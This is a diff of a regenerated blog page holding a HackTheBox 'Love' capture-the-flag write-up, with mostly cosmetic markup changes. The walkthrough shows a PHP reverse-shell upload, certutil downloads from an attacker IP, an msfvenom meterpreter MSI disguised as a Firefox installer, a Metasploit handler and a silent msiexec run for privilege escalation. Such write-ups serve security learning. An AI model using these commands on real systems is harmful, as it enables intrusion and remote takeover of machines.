@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.118.2"><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,11 +14,11 @@
 
     <title>Love Writeup (HackTheBox) | Doomdesire</title>
 
-    <link rel="stylesheet" href="/css/meme.min.47b7defd9dcca4589f4d279a79d656a7d334f973be4a3a4f1893fd20fc857df5.css"/>
+    <link rel="stylesheet" href="/css/meme.min.353693cdab7615152d304004b0e93d7af7fc743668040b9951ebb05d714ac96f.css"/>
 
     
     
-        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.a74e28464a7eeed54b4e02aead6360ae76bbd5ee5745afdf0a47319b6541600e.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js" defer></script><script src="/js/meme.min.07eb0af6b6ace5741d44ee2fa3e3defd0fe88ef104f8c52f4ee23b1e0fe0b06d.js"></script>
 
     
 
@@ -286,7 +286,7 @@ Love is an easy HackTheBox Windows machine created by <strong>pwnmeow</strong> (
 <p>We can start with the standard nmap, scanning all ports:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -367,86 +367,86 @@ Love is an easy HackTheBox Windows machine created by <strong>pwnmeow</strong> (
 </span><span class="lnt">79
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sC -sV -p- 10.10.10.239 -oA Love
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-03 06:09 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.239
-Host is up <span class="o">(</span>0.080s latency<span class="o">)</span>.
-Not shown: <span class="m">65516</span> closed ports
-PORT      STATE SERVICE      VERSION
-80/tcp    open  http         Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
-<span class="p">|</span> http-cookie-flags: 
-<span class="p">|</span>   /: 
-<span class="p">|</span>     PHPSESSID: 
-<span class="p">|</span>_      httponly flag not <span class="nb">set</span>
-<span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
-<span class="p">|</span>_http-title: Voting System using PHP
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
-<span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
-<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
-<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span>in
-<span class="p">|</span> Not valid before: 2021-01-18T14:00:16
-<span class="p">|</span>_Not valid after:  2022-01-18T14:00:16
-<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
-<span class="p">|</span> tls-alpn: 
-<span class="p">|</span>_  http/1.1
-445/tcp   open  microsoft-ds Windows <span class="m">10</span> Pro <span class="m">19042</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
-3306/tcp  open  mysql?
-5000/tcp  open  http         Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
-<span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
-<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
-5040/tcp  open  unknown
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-<span class="p">|</span>_http-title: Not Found
-5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-<span class="p">|</span>_http-title: Not Found
-<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
-<span class="p">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
-<span class="p">|</span> Not valid before: 2021-04-11T14:39:19
-<span class="p">|</span>_Not valid after:  2024-04-10T14:39:19
-<span class="p">|</span>_ssl-date: 2021-08-03T10:44:06+00:00<span class="p">;</span> +29m16s from scanner time.
-<span class="p">|</span> tls-alpn: 
-<span class="p">|</span>_  http/1.1
-7680/tcp  open  pando-pub?
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
-<span class="p">|</span>_http-title: Not Found
-49664/tcp open  msrpc        Microsoft Windows RPC
-49665/tcp open  msrpc        Microsoft Windows RPC
-49666/tcp open  msrpc        Microsoft Windows RPC
-49667/tcp open  msrpc        Microsoft Windows RPC
-49668/tcp open  msrpc        Microsoft Windows RPC
-49669/tcp open  msrpc        Microsoft Windows RPC
-49670/tcp open  msrpc        Microsoft Windows RPC
-Service Info: Hosts: www.example.com, LOVE, www.love.htb<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-
-Host script results:
-<span class="p">|</span>_clock-skew: mean: 2h14m16s, deviation: 3h30m01s, median: 29m15s
-<span class="p">|</span> smb-os-discovery: 
-<span class="p">|</span>   OS: Windows <span class="m">10</span> Pro <span class="m">19042</span> <span class="o">(</span>Windows <span class="m">10</span> Pro 6.3<span class="o">)</span>
-<span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_10::-
-<span class="p">|</span>   Computer name: Love
-<span class="p">|</span>   NetBIOS computer name: LOVE<span class="se">\x</span><span class="m">00</span>
-<span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
-<span class="p">|</span>_  System time: 2021-08-03T03:43:53-07:00
-<span class="p">|</span> smb-security-mode: 
-<span class="p">|</span>   account_used: &lt;blank&gt;
-<span class="p">|</span>   authentication_level: user
-<span class="p">|</span>   challenge_response: supported
-<span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
-<span class="p">|</span> smb2-security-mode: 
-<span class="p">|</span>   2.02: 
-<span class="p">|</span>_    Message signing enabled but not required
-<span class="p">|</span> smb2-time: 
-<span class="p">|</span>   date: 2021-08-03T10:43:51
-<span class="p">|</span>_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 328.65 seconds
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV -p- 10.10.10.239 -oA Love
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-03 06:09 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.239
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.080s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65516</span> closed ports
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE      VERSION
+</span></span><span class="line"><span class="cl">80/tcp    open  http         Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   /: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Voting System using PHP
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span>in
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-01-18T14:00:16
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-01-18T14:00:16
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds Windows <span class="m">10</span> Pro <span class="m">19042</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3306/tcp  open  mysql?
+</span></span><span class="line"><span class="cl">5000/tcp  open  http         Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
+</span></span><span class="line"><span class="cl">5040/tcp  open  unknown
+</span></span><span class="line"><span class="cl">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-11T14:39:19
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-04-10T14:39:19
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-08-03T10:44:06+00:00<span class="p">;</span> +29m16s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl">7680/tcp  open  pando-pub?
+</span></span><span class="line"><span class="cl">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49668/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49669/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49670/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Hosts: www.example.com, LOVE, www.love.htb<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 2h14m16s, deviation: 3h30m01s, median: 29m15s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows <span class="m">10</span> Pro <span class="m">19042</span> <span class="o">(</span>Windows <span class="m">10</span> Pro 6.3<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_10::-
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: Love
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: LOVE<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Workgroup: WORKGROUP<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2021-08-03T03:43:53-07:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: &lt;blank&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-08-03T10:43:51
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 328.65 seconds
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="flags-used"><a href="#flags-used" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Flags used:</h3>
 <ul>
@@ -466,11 +466,11 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 <p>This appears to be a voting system that requires valid credentials in order to log in. Something to note is that it uses php, something we can confirm from the <strong>Wappalyzer</strong> Firefox plugin, the server&rsquo;s title or if we visit <strong>http://10.10.10.239/index.php</strong>. We also start our <strong>gobuster</strong> with:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>The <strong>-x</strong> argument is going to help us identify files and not only folders on the server. Our file choice can vary, however we only search for <strong>.txt</strong> and <strong>.php</strong> files since we identified that the server uses php. Looking at it&rsquo;s results, we see that a <strong>/admin</strong> folder exists. Visiting <strong>http://10.10.10.239/admin/</strong> we see the following:</p>
 <p><img src="https://netuserdoomdesire.github.io/Love/4.png" alt="Pasted image 20210803064531.png"></p>
@@ -524,7 +524,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 <li>Find where the server saves this image.</li>
 <li>Try to upload a .php file instead of an image file and execute it from the path we identified from the previous step.</li>
 </ul>
-<p>The first mission is quite easy, since we can just right click on the profile image and select &ldquo;<strong>View Image</strong>&quot;:</p>
+<p>The first mission is quite easy, since we can just right click on the profile image and select &ldquo;<strong>View Image</strong>&rdquo;:</p>
 <p><img src="https://netuserdoomdesire.github.io/Love/20.png" alt="Pasted image 20210805145835.png"></p>
 <p>It is clear here based on the URL, that the server saves any uploaded image to the <strong>/image</strong> path.</p>
 <p>To succeed in the second mission we will try to upload a .php reverse shell. What we may encounter in general, are upload filters, however, as we will see, there are no filters in this particular box. The shell we are going to upload is found here (of course you can experiment with any shell found online, since there are many of them):</p>
@@ -536,11 +536,11 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 <p>The last step would be to see if our shell is functional by visiting the <strong>/images/reverse_shell.php</strong> path. Before that we should of course start our listener:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">rlwrap nc -nvlp <span class="m">9001</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rlwrap nc -nvlp <span class="m">9001</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>As you noticed we used <strong>rlwrap</strong>. The reason is this is a windows machine and it will be hard creating an interactive shell the way we would on a linux target. rlwrap (<a href="https://github.com/hanslub42/rlwrap" target="_blank" rel="noopener">https://github.com/hanslub42/rlwrap</a>) helps us making the shell somewhat interactive.
 Visiting <strong>10.10.10.239/images/reverse.php</strong> we get a shell:</p>
@@ -550,19 +550,19 @@ Visiting <strong>10.10.10.239/images/reverse.php</strong> we get a shell:</p>
 <p>Since we are now in the box, firing up <strong>winpeas</strong> (<a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank" rel="noopener">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>) is a perfect start to identify any vulnerability, so we transfer it to the target by using <strong>certutil.exe</strong> after hosting it on a <strong>Python 3</strong> simple server on our box:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> <span class="se">\
-</span><span class="se"></span>mkdir temp
-<span class="nb">cd</span> temp
-certutil -urlcache -f <span class="s2">&#34;http://10.10.14.3/winpeas.exe&#34;</span> winpeas.exe
-.<span class="se">\w</span>inpeas.exe
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>mkdir temp
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> temp
+</span></span><span class="line"><span class="cl">certutil -urlcache -f <span class="s2">&#34;http://10.10.14.3/winpeas.exe&#34;</span> winpeas.exe
+</span></span><span class="line"><span class="cl">.<span class="se">\w</span>inpeas.exe
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>One of the advantages of winpeas, is that it will color code it&rsquo;s findings based on severity. After scrolling a bit we see the following, color coded with red (an interesting find):</p>
 <p><img src="https://netuserdoomdesire.github.io/Love/23.png" alt="Pasted image 20210805161045.png"></p>
@@ -575,25 +575,25 @@ certutil -urlcache -f <span class="s2">&#34;http://10.10.14.3/winpeas.exe&#34;</
 <p>At this point it is pretty clear what we have to do. We will create a malicious <strong>.msi</strong> file, transfer it to the victim and execute it, in order to get an elevated shell. The tool we are going to use is of course msfvenom, and our payload of choice will be a <strong>meterpreter reverse tcp</strong>:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.3 <span class="nv">lport</span><span class="o">=</span><span class="m">9002</span> -f msi &gt; <span class="s2">&#34;Firefox_Setup.msi&#34;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.3 <span class="nv">lport</span><span class="o">=</span><span class="m">9002</span> -f msi &gt; <span class="s2">&#34;Firefox_Setup.msi&#34;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>On the output we can just select a random name that will not raise suspicions. A Firefox setup package name will do the job just fine. Next step is hosting the malicious file and transfering it to the target:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">certutil -urlcache -f <span class="s2">&#34;http://10.10.14.3/Firefox_Setup.msi&#34;</span> Firefox_Setup.msi
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certutil -urlcache -f <span class="s2">&#34;http://10.10.14.3/Firefox_Setup.msi&#34;</span> Firefox_Setup.msi
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Before exeuting the file we of course need to start listening on port 9002 that we specified. We will open a handler on Metasploit, select the correct payload, and start listening:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -601,22 +601,22 @@ certutil -urlcache -f <span class="s2">&#34;http://10.10.14.3/winpeas.exe&#34;</
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msfconsole
-use exploit/multi/handler
-<span class="nb">set</span> payload windows/meterpreter/reverse_tcp
-<span class="nb">set</span> lhost 10.10.14.3
-<span class="nb">set</span> lport <span class="m">9002</span>
-run
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole
+</span></span><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> lhost 10.10.14.3
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> lport <span class="m">9002</span>
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Last step is executing the malicious file. To install it, we are going to use <strong>msiexec</strong> since we want full control over the installation process:</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">msiexec /quiet /qn /i Firefox_Setup.msi
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msiexec /quiet /qn /i Firefox_Setup.msi
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>The options used here are:</p>
 <ul>
@@ -628,9 +628,9 @@ run
 <p><img src="https://netuserdoomdesire.github.io/Love/24.png" alt="Pasted image 20210805163948.png"></p>
 <h1 id="useful-resources"><a href="#useful-resources" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Useful Resources</h1>
 <ul>
-<li><a href="https://blog.sqreen.com/ssrf-explained/:" target="_blank" rel="noopener">https://blog.sqreen.com/ssrf-explained/:</a> SSRF Explained</li>
-<li><a href="https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf:" target="_blank" rel="noopener">https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf:</a> More SSRF stuff including a cheatsheet.</li>
